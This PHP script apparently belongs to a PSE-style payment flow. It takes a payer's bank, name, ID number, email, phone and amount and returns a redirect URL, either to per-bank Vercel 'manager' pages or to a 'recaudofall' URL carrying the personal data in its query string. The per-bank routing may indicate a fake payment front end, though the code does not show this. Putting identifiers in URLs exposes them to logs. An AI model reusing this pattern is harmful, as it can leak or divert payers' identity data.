<?php
/**
 * Calcula la URL de destino del pago según el banco elegido.
 *
 * - Si el banco está en 'primary_banks' → Vercel con su slug + id
 * - Si NO está en 'primary_banks' → recaudofall con sus datos en query string
 *
 * Acepta POST con JSON: { tipoEntidad, banco, nombre, cedula, email, telefono, monto }
 * Devuelve JSON: { ok, url, banco } o { ok:false, error }
 */
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

// ---------------------------------------------------------------
// DEBUG: pon en true para ver exactamente qué bytes llegan
// ---------------------------------------------------------------
const DEBUG_BANCO = false;

// ---------------------------------------------------------------
// 1. Validar método
// ---------------------------------------------------------------
if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'method_not_allowed']);
    exit;
}

// ---------------------------------------------------------------
// 2. Cargar configuración
// ---------------------------------------------------------------
$configPath = __DIR__ . '/pse-config.php';
if (!is_file($configPath)) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'config_no_encontrada']);
    exit;
}
$config = require $configPath;

// ---------------------------------------------------------------
// 3. Leer payload JSON
// ---------------------------------------------------------------
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'bad_json']);
    exit;
}

// ---------------------------------------------------------------
// 4. Helpers
// ---------------------------------------------------------------
$limpiar = static function ($v, int $max = 200): string {
    $v = is_scalar($v) ? (string) $v : '';
    $v = trim(preg_replace('/[\x00-\x1F\x7F]/u', '', $v) ?? '');
    return mb_substr($v, 0, $max);
};

/**
 * Normaliza un nombre de banco a su clave interna.
 * Maneja UTF-8, ISO-8859-1 y Windows-1252, y quita tildes.
 */
$normalizar = static function (string $texto, array $aliases): string {

    // --- 1. Detectar codificación real y convertir a UTF-8 ---
    if ($texto === '')
        return '';

    $enc = mb_detect_encoding($texto, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true);
    if ($enc && $enc !== 'UTF-8') {
        $texto = mb_convert_encoding($texto, 'UTF-8', $enc);
    }

    // --- 2. A mayúsculas (multibyte) ---
    $texto = mb_strtoupper($texto, 'UTF-8');

    // --- 3. Quitar tildes / diacríticos ---
    $mapa = [
        'Á' => 'A',
        'À' => 'A',
        'Ä' => 'A',
        'Â' => 'A',
        'Ã' => 'A',
        'Å' => 'A',
        'É' => 'E',
        'È' => 'E',
        'Ë' => 'E',
        'Ê' => 'E',
        'Í' => 'I',
        'Ì' => 'I',
        'Ï' => 'I',
        'Î' => 'I',
        'Ó' => 'O',
        'Ò' => 'O',
        'Ö' => 'O',
        'Ô' => 'O',
        'Õ' => 'O',
        'Ú' => 'U',
        'Ù' => 'U',
        'Ü' => 'U',
        'Û' => 'U',
        'Ñ' => 'N',
        'Ç' => 'C',
        'Ý' => 'Y',
    ];
    $texto = strtr($texto, $mapa);

    // --- 4. Limpiar todo lo que no sea A-Z, 0-9 o espacio ---
    $texto = preg_replace('/[^A-Z0-9 ]+/', ' ', $texto);
    $texto = trim(preg_replace('/\s+/', ' ', $texto));

    // --- 5. Buscar en aliases ---
    if (isset($aliases[$texto])) {
        return $aliases[$texto];
    }

    // --- 6. Fallback: slug con guiones ---
    $slug = strtolower(preg_replace('/[^A-Z0-9]+/', '-', $texto));
    return trim($slug, '-');
};

// ---------------------------------------------------------------
// 5. Extraer y sanitizar entrada
// ---------------------------------------------------------------
$bancoRaw = $limpiar($data['banco'] ?? '', 120);
$nombre = $limpiar($data['nombre'] ?? '', 150);
$cedula = $limpiar($data['cedula'] ?? '', 30);
$email = $limpiar($data['email'] ?? '', 150);
$telefono = $limpiar($data['telefono'] ?? '', 20);
$monto = $limpiar($data['monto'] ?? '0', 20);
$tipoEntidad = $limpiar($data['tipoEntidad'] ?? 'aval', 20);

if ($bancoRaw === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'banco_requerido']);
    exit;
}

// ---------------------------------------------------------------
// 6. Normalizar nombre del banco a clave interna
// ---------------------------------------------------------------
$bancoClave = $normalizar($bancoRaw, $config['aliases'] ?? []);

// ---------------------------------------------------------------
// 7. DEBUG opcional
// ---------------------------------------------------------------
if (DEBUG_BANCO) {
    $bytes = [];
    for ($i = 0; $i < strlen($bancoRaw); $i++) {
        $bytes[] = sprintf('%02X', ord($bancoRaw[$i]));
    }
    echo json_encode([
        'debug' => [
            'bancoRaw' => $bancoRaw,
            'bytes' => implode(' ', $bytes),
            'encoding' => mb_detect_encoding($bancoRaw, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true),
            'bancoClave' => $bancoClave,
            'primary_keys' => array_keys($config['primary_banks'] ?? []),
            'recaudo_keys' => array_slice(array_keys($config['recaudofall_banks'] ?? []), 0, 10),
        ]
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ---------------------------------------------------------------
// 8. Normalizar monto a entero sin separadores
// ---------------------------------------------------------------
$montoLimpio = preg_replace('/[^\d]/', '', $monto) ?: '0';

// ---------------------------------------------------------------
// 9. Decidir destino
// ---------------------------------------------------------------
$primaryBanks = $config['primary_banks'] ?? [];

if (isset($primaryBanks[$bancoClave])) {

    // -------- Redirigir a Vercel --------
    $slug = $primaryBanks[$bancoClave]['slug'];
    $id = $primaryBanks[$bancoClave]['id'];
    $url = rtrim($config['links']['primary_page'], '/') . "/sites/{$slug}/manager/{$id}";

} else {

    // -------- Redirigir a recaudofall --------
    if (!isset($config['recaudofall_banks'][$bancoClave])) {
        http_response_code(400);
        echo json_encode([
            'ok' => false,
            'error' => 'banco_no_soportado',
            'banco' => $bancoClave,
        ]);
        exit;
    }

    $query = http_build_query([
        'banco' => $bancoClave,
        'monto' => $montoLimpio,
        'email' => $email,
        'cedula' => $cedula,
        'nombre' => $nombre,
        'telefono' => $telefono,
    ]);

    $url = rtrim($config['links']['recaudofall_base'], '?&') . '?' . $query;
}

// ---------------------------------------------------------------
// 10. Responder
// ---------------------------------------------------------------
echo json_encode([
    'ok' => true,
    'url' => $url,
    'banco' => $bancoClave,
]);